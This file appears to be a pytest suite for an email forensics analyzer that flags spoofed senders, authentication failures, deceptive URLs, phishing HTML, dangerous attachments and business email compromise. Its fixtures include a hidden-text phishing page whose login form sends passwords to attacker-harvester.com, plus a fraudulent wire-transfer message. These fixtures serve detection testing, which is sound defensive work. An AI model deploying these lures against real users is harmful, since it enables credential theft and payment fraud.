import email
from email import policy
from pathlib import Path
import pytest

from app.analyzers.email_forensics import (
    audit_email_file_integrity,
    audit_authentication_posture,
    analyze_sender_and_lookalikes,
    analyze_url_threats,
    analyze_html_and_browser_phishing,
    analyze_attachment_forensics,
    analyze_bec_and_financial_fraud,
    calculate_email_verdict,
    get_email_offline_tools_guide,
    compute_levenshtein,
    normalize_domain_chars,
)
from app.analyzers.email_analyzer import EmailAnalyzer


def test_levenshtein_and_normalization():
    assert compute_levenshtein("microsoft", "micros0ft") == 1
    assert compute_levenshtein("paypal", "paypa1") == 1
    assert compute_levenshtein("apple", "app1e") == 1
    assert normalize_domain_chars("micros0ft.com") == "microsoft.com"
    assert normalize_domain_chars("paypa1.com") == "paypal.com"


def test_email_file_integrity_eml():
    raw_eml = (
        b"From: security@paypal.com\r\n"
        b"From: duplicate@attacker.com\r\n"
        b"To: victim@target.com\r\n"
        b"Subject: Urgent: Verify Account\r\n"
        b"Date: Sun, 04 Oct 2026 12:00:00 +0000\r\n"
        b"Message-ID: <12345@paypal.com>\r\n"
        b"MIME-Version: 1.0\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n"
        b"\r\n"
        b"Please verify your credentials immediately.\r\n"
    )
    msg = email.message_from_bytes(raw_eml, policy=policy.default)
    integrity = audit_email_file_integrity(raw_eml, "test.eml", msg, is_ole_msg=False)

    assert integrity["is_valid_format"] is True
    assert "RFC 5322" in integrity["format"]
    assert len(integrity["file_hashes"]["sha256"]) == 64
    assert len(integrity["file_hashes"]["sha1"]) == 40
    assert len(integrity["file_hashes"]["md5"]) == 32
    assert integrity["header_body_separated"] is True
    # Duplicate 'From' header detected
    dup_names = [d["name"] for d in integrity["duplicate_headers"]]
    assert "FROM" in dup_names


def test_authentication_posture():
    all_headers = [
        {"name": "Authentication-Results", "value": "mx.google.com; dkim=fail header.i=@attacker.com; spf=fail (google.com: domain of spoof@attacker.com does not designate 198.51.100.1 as permitted sender); dmarc=fail p=reject"},
        {"name": "Received-SPF", "value": "fail (google.com: domain of spoof@attacker.com does not designate 198.51.100.1) client-ip=198.51.100.1; envelope-from=<spoof@attacker.com>;"},
        {"name": "DKIM-Signature", "value": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=attacker.com; s=selector1;"}
    ]
    headers = {"from": "CEO <ceo@target.com>"}
    posture = audit_authentication_posture(headers, all_headers, "target.com", [])

    assert posture["dmarc"]["status"] == "fail"
    assert posture["spf"]["status"] == "fail"
    assert posture["dkim"]["status"] == "fail"
    assert posture["dmarc"]["spf_alignment"] is False
    assert len(posture["flags"]) > 0


def test_lookalike_and_display_name_spoofing():
    # 1. Typosquatting / Lookalike domain
    from_hdr = "Microsoft Security Alert <alert@micros0ft.com>"
    res = analyze_sender_and_lookalikes(from_hdr, "attacker@gmail.com", "", "", [])
    assert res["lookalike_domain"]["is_lookalike"] is True
    assert res["lookalike_domain"]["impersonated_brand"] == "Microsoft"
    assert res["reply_to_mismatch"]["is_mismatched"] is True
    assert res["reply_to_mismatch"]["is_free_webmail_redirect"] is True

    # 2. Executive VIP Impersonation
    vip_hdr = "Chief Executive Officer <randomuser99@unknown.ru>"
    vip_res = analyze_sender_and_lookalikes(vip_hdr, "", "", "", [])
    assert vip_res["vip_executive_impersonation"]["is_impersonating"] is True


def test_url_threats_analysis():
    urls = [
        "http://192.168.1.50/login.php",
        "https://google.com@evil-phish.com/verify",
        "https://bit.ly/3xSuspicious",
        "https://login.microsoftonline.com/auth"
    ]
    deceptive = [{
        "displayed_text": "https://chase.com/secure",
        "actual_destination": "http://192.168.1.50/login.php",
        "destination_host": "192.168.1.50"
    }]
    threats = analyze_url_threats(urls, deceptive, [])

    assert threats["total_urls_extracted"] == 4
    assert threats["deceptive_links_count"] == 1
    assert threats["ip_host_links_count"] == 1
    assert threats["userinfo_obfuscated_count"] == 1
    assert threats["shortened_links_count"] == 1
    assert threats["credential_harvesting_count"] >= 2


def test_html_and_browser_phishing():
    html_body = """
    <html>
      <head>
        <meta http-equiv="refresh" content="5;url=https://evil-redirect.com">
      </head>
      <body>
        <div style="font-size: 0px; color: transparent;">Hidden evasion words for perimeter scanners</div>
        <div style="position: absolute; left: -9999px;">Offscreen content</div>
        <form action="https://attacker-harvester.com/post.php" method="POST">
          <input type="text" name="username">
          <input type="password" name="password">
          <input type="submit" value="Log In">
        </form>
        <iframe src="https://silent-iframe-exploit.com" width="0" height="0"></iframe>
      </body>
    </html>
    """
    html_forensics = analyze_html_and_browser_phishing(html_body, "", [])

    assert html_forensics["has_html"] is True
    assert html_forensics["hidden_text_detected"] is True
    assert len(html_forensics["hidden_text_items"]) >= 2
    assert len(html_forensics["credential_forms"]) == 1
    assert html_forensics["credential_forms"][0]["has_password_input"] is True
    assert len(html_forensics["meta_refreshes"]) == 1
    assert len(html_forensics["iframes"]) == 1


def test_attachment_forensics():
    attachments = [
        {
            "filename": "Payroll_Q3.pdf.exe",
            "size": 1048576,
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "mime_type": "application/x-dosexec",
            "threat_reason": "Dangerous executable extension: .exe"
        },
        {
            "filename": "Invoice_9812.docm",
            "size": 45000,
            "sha256": "a" * 64,
            "mime_type": "application/vnd.ms-word.document.macroEnabled.12",
            "ole_macros": True,
            "threat_reason": "VBA macro code detected"
        },
        {
            "filename": "statement.pdf",
            "size": 89000,
            "sha256": "b" * 64,
            "mime_type": "application/pdf",
            "threat_reason": "Disguised executable / Extension mismatch"
        }
    ]
    att_forensics = analyze_attachment_forensics(attachments, [])

    assert att_forensics["total_attachments"] == 3
    assert att_forensics["dangerous_count"] >= 1
    assert att_forensics["double_extension_count"] == 1
    assert att_forensics["macro_enabled_count"] == 1
    assert att_forensics["mismatch_count"] == 1


def test_bec_and_financial_fraud():
    subject = "URGENT: Change of Banking Details for Pending Remittance"
    body = (
        "Good morning, please note our new bank account number and updated wire transfer instructions. "
        "Strict confidentiality is required; do not discuss this wire transfer with anyone until completed before 5pm."
    )
    bec = analyze_bec_and_financial_fraud(subject, body, "CEO <ceo@company.com>", "", [])

    assert bec["bec_detected"] is True
    assert bec["bec_risk_score"] >= 70
    assert bec["bank_payment_redirection"]["detected"] is True
    assert bec["urgency_secrecy"]["detected"] is True
    assert "Wire Transfer / Banking Redirection" in bec["financial_fraud_types"]


def test_executive_email_verdict():
    file_integ = {"unicode_anomalies": {"bidi_controls_detected": False}}
    auth = {"dmarc": {"status": "fail"}}
    sender = {
        "from_domain": "micros0ft.com",
        "display_name": "Microsoft 365",
        "from_address": "support@micros0ft.com",
        "lookalike_domain": {"is_lookalike": True, "canonical_domain": "microsoft.com", "impersonated_brand": "Microsoft"},
        "display_name_spoofing": {"is_spoofed": True, "impersonated_entity": "Microsoft"},
        "reply_to_mismatch": {"is_mismatched": True}
    }
    url_thr = {
        "deceptive_links_count": 1,
        "userinfo_obfuscated_count": 0,
        "credential_harvesting_count": 1,
        "url_items": [{"url": "https://micros0ft.com/login"}]
    }
    html_f = {"credential_forms": [{"has_password_input": True}]}
    att_f = {"dangerous_count": 1, "mismatch_count": 0}
    bec_f = {"bec_detected": False, "bec_risk_score": 10}

    verdict = calculate_email_verdict(
        file_integrity=file_integ,
        auth_posture=auth,
        sender_analysis=sender,
        url_threats=url_thr,
        html_forensics=html_f,
        attachment_forensics=att_f,
        bec_analysis=bec_f,
        findings=[]
    )

    assert verdict["verdict"] == "Malicious"
    assert verdict["severity"] == "critical"
    assert verdict["confidence_score"] >= 90
    assert len(verdict["key_assessment_rationale"]) > 0
    assert len(verdict["containment_guidance"]) > 0
    assert "T1566.001" in verdict["mitre_attack_techniques"]
    assert "T1566.002" in verdict["mitre_attack_techniques"]


def test_offline_tools_guide():
    guide = get_email_offline_tools_guide("malicious_invoice.eml")
    assert "file malicious_invoice.eml" in guide["file_hash"]["command"]
    assert "ripmime" in guide["ripmime"]["command"]
    assert "extract_msg" in guide["extract_msg"]["command"]
    assert "yara" in guide["yara_scan"]["command"]


def test_email_analyzer_end_to_end_checklist():
    analyzer = EmailAnalyzer()
    eml_path = Path("test-files/phishing_credential_alert.eml")
    assert eml_path.exists()

    result = analyzer.analyze(eml_path, "phishing_credential_alert.eml", "message/rfc822")
    assert result.success is True
    data = result.data

    # Verify checklist fields are populated
    assert "file_integrity" in data
    assert "auth_posture" in data
    assert "lookalike_analysis" in data
    assert "url_threats" in data
    assert "html_forensics" in data
    assert "attachment_forensics" in data
    assert "bec_analysis" in data
    assert "email_verdict" in data
    assert "offline_tools_guide" in data

    # Verify verdict structure
    verdict = data["email_verdict"]
    assert verdict["verdict"] in ["Malicious", "Suspicious", "Potentially Phishing / BEC", "No Known Threat Detected"]
    assert 0 <= verdict["confidence_score"] <= 100
    assert len(verdict["key_assessment_rationale"]) > 0
    assert len(verdict["containment_guidance"]) > 0
